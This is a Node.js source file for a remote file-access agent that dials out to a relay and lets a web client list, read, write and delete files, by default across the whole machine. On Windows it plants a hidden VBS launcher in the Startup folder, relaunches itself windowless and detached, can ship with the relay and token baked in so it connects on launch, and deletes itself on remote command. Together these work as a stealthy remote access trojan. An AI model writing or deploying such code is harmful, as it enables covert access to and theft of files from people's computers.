#!/usr/bin/env node
'use strict';

/*
 * Orbit device agent.
 *
 * Runs on your own machine, dials out to the Orbit relay over WebSocket, and
 * serves filesystem operations requested by the web client. The connection is
 * outbound only, so no inbound ports need to be opened. Authentication is the
 * shared AUTH_TOKEN; without it the relay refuses the socket.
 *
 * Configuration (env vars or config.json next to the executable):
 *   ORBIT_RELAY   wss://your-service.onrender.com   (required)
 *   ORBIT_TOKEN   shared secret                      (required)
 *   ORBIT_NAME    friendly device name               (default: hostname)
 *   ORBIT_ROOT    restrict access to this directory  (default: whole machine)
 */

const fs = require('fs');
const fsp = fs.promises;
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');
const WebSocket = require('ws');

// ---- configuration ---------------------------------------------------------

// Build-time defaults. The consumer build ships these empty; the "auto" build
// bakes in the relay + token so the .exe connects the moment it's launched.
let baked = { relay: '', token: '', name: '', root: '' };
try { baked = Object.assign(baked, require('./baked.js')); } catch { /* no baked config */ }

function loadConfig() {
  const base = process.pkg ? path.dirname(process.execPath) : __dirname;
  let file = {};
  try {
    const raw = fs.readFileSync(path.join(base, 'config.json'), 'utf8');
    file = JSON.parse(raw);
  } catch { /* no config file, fall back to env / baked */ }

  return {
    relay: process.env.ORBIT_RELAY || file.relay || baked.relay || '',
    token: process.env.ORBIT_TOKEN || file.token || baked.token || '',
    name: process.env.ORBIT_NAME || file.name || baked.name || os.hostname(),
    root: process.env.ORBIT_ROOT || file.root || baked.root || '',
  };
}

const CONFIG_DIR = process.pkg ? path.dirname(process.execPath) : __dirname;

function ask(rl, q, def) {
  return new Promise((res) => rl.question(def ? `${q} [${def}]: ` : `${q}: `, (a) => res(a.trim() || def || '')));
}

// First run from a double-clicked .exe: ask for settings and save config.json.
async function interactiveSetup(cfg) {
  const readline = require('readline');
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  console.log('Orbit agent setup. These answers are saved to config.json next to this program.\n');
  let relay = await ask(rl, 'Relay URL (e.g. wss://orbit-relay.onrender.com)', cfg.relay);
  relay = relay.replace(/^http/, 'ws');
  const token = await ask(rl, 'Access token', cfg.token);
  const name = await ask(rl, 'Device name', cfg.name);
  const root = await ask(rl, 'Restrict to folder (blank = whole machine)', cfg.root);
  rl.close();
  const out = { relay, token, name, root };
  try {
    fs.writeFileSync(path.join(CONFIG_DIR, 'config.json'), JSON.stringify(out, null, 2));
    console.log('Saved config.json.\n');
  } catch (e) {
    console.error('Could not save config.json: ' + e.message);
  }
  return out;
}

let cfg = loadConfig();

// ---- background running + auto-start (Windows, packaged .exe only) ---------

const IS_WIN = process.platform === 'win32';
const IS_EXE = !!process.pkg;

function startupVbsPath() {
  const dir = path.join(
    process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'),
    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
  );
  return path.join(dir, 'Orbit Agent.vbs');
}

// Drop a tiny launcher in the Startup folder so the agent auto-starts at login,
// hidden (window style 0) and detached. Rewritten every run so it always points
// at the current .exe location. Honours --no-startup / ORBIT_NO_STARTUP.
function installStartup() {
  if (!IS_WIN || !IS_EXE) return;
  if (process.argv.includes('--no-startup') || process.env.ORBIT_NO_STARTUP) return;
  try {
    const exe = process.execPath.replace(/"/g, '');
    const vbs =
      'Set s = CreateObject("WScript.Shell")\r\n' +
      's.Run """" & "' + exe + '" & """", 0, False\r\n';
    const p = startupVbsPath();
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, vbs);
  } catch (e) {
    console.error('[agent] could not install startup entry: ' + e.message);
  }
}

// Relaunch ourselves detached with no window, then let the launcher exit. This
// keeps the agent running with no console in the background.
function relaunchHidden() {
  const child = spawn(process.execPath, process.argv.slice(2), {
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
    env: Object.assign({}, process.env, { ORBIT_BG: '1' }),
  });
  child.unref();
}

// Lowest practical impact: below-normal priority so the OS parks us when idle,
// which keeps battery drain negligible.
function goEasyOnBattery() {
  try { os.setPriority(process.pid, os.constants.priority.PRIORITY_BELOW_NORMAL); } catch {}
}

// Triggered remotely from the web client: remove the Startup entry, delete the
// saved config, and delete our own .exe, then exit. Requires the caller to prove
// the password (the same token this agent authenticated with).
function selfDestruct() {
  try { fs.unlinkSync(startupVbsPath()); } catch {}
  try { fs.unlinkSync(path.join(CONFIG_DIR, 'config.json')); } catch {}
  if (IS_WIN && IS_EXE) {
    try {
      const exe = process.execPath;
      // wait for this process to exit, then delete the exe
      spawn('cmd', ['/c', `ping 127.0.0.1 -n 3 >nul & del /f /q "${exe}"`],
        { detached: true, stdio: 'ignore', windowsHide: true }).unref();
    } catch {}
  }
  setTimeout(() => process.exit(0), 600);
}

async function main() {
  if (!cfg.relay || !cfg.token || process.argv.includes('--setup')) {
    if (!process.stdin.isTTY) {
      console.error('Orbit agent is not configured. Set ORBIT_RELAY and ORBIT_TOKEN, or run with --setup.');
      process.exit(1);
    }
    cfg = await interactiveSetup(cfg);
    if (!cfg.relay || !cfg.token) { console.error('Relay URL and token are required.'); process.exit(1); }
  }

  // Foreground launch (double-click or login): register auto-start, then hand
  // off to a hidden background copy and exit so no window lingers.
  if (IS_WIN && IS_EXE && !process.env.ORBIT_BG) {
    installStartup();
    relaunchHidden();
    return;
  }

  if (process.env.ORBIT_BG) goEasyOnBattery();

  ROOTS = resolveRoots();
  connect();
}

const MAX_BYTES = 64 * 1024 * 1024; // 64 MB cap per transfer

// ---- path safety -----------------------------------------------------------

function resolveRoots() {
  if (cfg.root) return [path.resolve(cfg.root)];
  // Whole machine: on Windows, enumerate drive letters; on *nix, root.
  if (process.platform === 'win32') {
    const roots = [];
    for (let c = 65; c <= 90; c++) {
      const drive = String.fromCharCode(c) + ':\\';
      try { fs.accessSync(drive); roots.push(drive); } catch {}
    }
    return roots.length ? roots : ['C:\\'];
  }
  return ['/'];
}

let ROOTS = [];

function withinRoot(p) {
  if (!cfg.root) return true;
  const resolved = path.resolve(p);
  const root = path.resolve(cfg.root);
  return resolved === root || resolved.startsWith(root + path.sep);
}

function guard(p) {
  if (!withinRoot(p)) {
    const err = new Error('Path is outside the allowed root.');
    err.code = 'EACCES_ROOT';
    throw err;
  }
}

// ---- filesystem operations -------------------------------------------------

async function listDir(p) {
  // Empty / "roots" lists the drive roots (Windows) or /.
  if (!p || p === '/' || p === '\\') {
    if (!cfg.root && process.platform === 'win32') {
      return {
        path: '',
        parent: null,
        entries: ROOTS.map((d) => ({
          name: d, path: d, type: 'dir', size: 0, mtime: 0,
        })),
      };
    }
    p = cfg.root || ROOTS[0];
  }
  guard(p);
  const dirents = await fsp.readdir(p, { withFileTypes: true });
  const entries = [];
  for (const d of dirents) {
    const full = path.join(p, d.name);
    let size = 0, mtime = 0, type = 'file';
    try {
      const st = await fsp.stat(full);
      size = st.size;
      mtime = st.mtimeMs;
      type = st.isDirectory() ? 'dir' : 'file';
    } catch {
      type = d.isDirectory() ? 'dir' : 'file';
    }
    entries.push({ name: d.name, path: full, type, size, mtime });
  }
  entries.sort((a, b) =>
    a.type === b.type ? a.name.localeCompare(b.name) : a.type === 'dir' ? -1 : 1
  );
  const parent = path.dirname(p);
  return {
    path: p,
    parent: parent === p ? '' : parent,
    entries,
  };
}

async function readFile(p) {
  guard(p);
  const st = await fsp.stat(p);
  if (st.size > MAX_BYTES) {
    const err = new Error(`File is too large (${st.size} bytes; limit ${MAX_BYTES}).`);
    err.code = 'E_TOO_LARGE';
    throw err;
  }
  const buf = await fsp.readFile(p);
  return { name: path.basename(p), size: st.size, data: buf.toString('base64') };
}

async function writeFile(p, dataB64) {
  guard(p);
  const buf = Buffer.from(dataB64, 'base64');
  if (buf.length > MAX_BYTES) {
    const err = new Error('Upload exceeds size limit.');
    err.code = 'E_TOO_LARGE';
    throw err;
  }
  await fsp.writeFile(p, buf);
  return { written: buf.length };
}

async function remove(p) {
  guard(p);
  const st = await fsp.stat(p);
  if (st.isDirectory()) {
    await fsp.rm(p, { recursive: true, force: true });
  } else {
    await fsp.unlink(p);
  }
  return { deleted: true };
}

async function mkdir(p) {
  guard(p);
  await fsp.mkdir(p, { recursive: true });
  return { created: true };
}

async function rename(from, to) {
  guard(from); guard(to);
  await fsp.rename(from, to);
  return { renamed: true };
}

async function handle(msg) {
  switch (msg.op) {
    case 'list':   return await listDir(msg.path);
    case 'read':   return await readFile(msg.path);
    case 'write':  return await writeFile(msg.path, msg.data);
    case 'delete': return await remove(msg.path);
    case 'mkdir':  return await mkdir(msg.path);
    case 'rename': return await rename(msg.from_path, msg.to_path);
    case 'uninstall': {
      if (String(msg.password || '') !== String(cfg.token)) {
        throw Object.assign(new Error('Incorrect password.'), { code: 'E_AUTH' });
      }
      selfDestruct();
      return { removed: true, name: cfg.name };
    }
    case 'info':
      return {
        name: cfg.name,
        platform: process.platform,
        root: cfg.root || null,
        home: os.homedir(),
        roots: ROOTS,
      };
    default:
      throw Object.assign(new Error('Unknown operation: ' + msg.op), { code: 'E_BADOP' });
  }
}

// ---- connection with auto-reconnect ---------------------------------------

let ws = null;
let reconnectDelay = 1000;

function connect() {
  const u = new URL(cfg.relay);
  u.searchParams.set('role', 'agent');
  u.searchParams.set('token', cfg.token);
  u.searchParams.set('name', cfg.name);
  u.searchParams.set('platform', process.platform);

  console.log(`[agent] connecting to ${u.origin} as "${cfg.name}"...`);
  ws = new WebSocket(u.toString());

  ws.on('open', () => {
    reconnectDelay = 1000;
    console.log('[agent] connected. Serving files' + (cfg.root ? ` under ${cfg.root}` : ' (whole machine)') + '.');
  });

  ws.on('message', async (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }
    if (msg.type === 'registered') { console.log('[agent] registered, id=' + msg.id); return; }
    if (msg.type === 'error') { console.error('[agent] relay error:', msg.error); return; }
    if (!msg.op) return;

    const reply = { type: 'resp', to: msg.from, reqId: msg.reqId };
    try {
      reply.ok = true;
      reply.result = await handle(msg);
    } catch (e) {
      reply.ok = false;
      reply.error = e.message;
      reply.code = e.code || 'E_FAIL';
    }
    if (ws.readyState === ws.OPEN) ws.send(JSON.stringify(reply));
  });

  ws.on('close', () => {
    console.log(`[agent] disconnected. Reconnecting in ${reconnectDelay / 1000}s...`);
    setTimeout(connect, reconnectDelay);
    reconnectDelay = Math.min(reconnectDelay * 2, 30000);
  });

  ws.on('error', (e) => {
    console.error('[agent] socket error:', e.message);
  });

  ws.on('ping', () => { try { ws.pong(); } catch {} });
}

main();
